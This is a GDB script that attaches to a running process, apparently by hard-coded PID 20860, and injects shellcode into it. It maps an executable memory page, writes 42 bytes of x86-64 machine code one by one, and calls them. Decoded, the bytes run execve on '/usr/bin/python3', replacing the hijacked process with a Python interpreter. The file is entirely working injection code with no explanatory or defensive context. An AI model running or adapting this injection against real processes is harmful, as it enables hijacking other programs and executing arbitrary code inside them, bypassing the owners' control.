set debuginfod enabled off
attach 20860
set $rwx = (void*)mmap(0, 4096, 7, 0x22, -1, 0)
printf "mmap addr: %p\n", $rwx
set {char}($rwx + 0) = 72
set {char}($rwx + 1) = 49
set {char}($rwx + 2) = 192
set {char}($rwx + 3) = 80
set {char}($rwx + 4) = 72
set {char}($rwx + 5) = 184
set {char}($rwx + 6) = 47
set {char}($rwx + 7) = 112
set {char}($rwx + 8) = 121
set {char}($rwx + 9) = 116
set {char}($rwx + 10) = 104
set {char}($rwx + 11) = 111
set {char}($rwx + 12) = 110
set {char}($rwx + 13) = 51
set {char}($rwx + 14) = 80
set {char}($rwx + 15) = 72
set {char}($rwx + 16) = 184
set {char}($rwx + 17) = 47
set {char}($rwx + 18) = 117
set {char}($rwx + 19) = 115
set {char}($rwx + 20) = 114
set {char}($rwx + 21) = 47
set {char}($rwx + 22) = 98
set {char}($rwx + 23) = 105
set {char}($rwx + 24) = 110
set {char}($rwx + 25) = 80
set {char}($rwx + 26) = 72
set {char}($rwx + 27) = 137
set {char}($rwx + 28) = 231
set {char}($rwx + 29) = 72
set {char}($rwx + 30) = 49
set {char}($rwx + 31) = 246
set {char}($rwx + 32) = 72
set {char}($rwx + 33) = 49
set {char}($rwx + 34) = 210
set {char}($rwx + 35) = 72
set {char}($rwx + 36) = 49
set {char}($rwx + 37) = 192
set {char}($rwx + 38) = 176
set {char}($rwx + 39) = 59
set {char}($rwx + 40) = 15
set {char}($rwx + 41) = 5
call ((void(*)())$rwx)()
detach
quit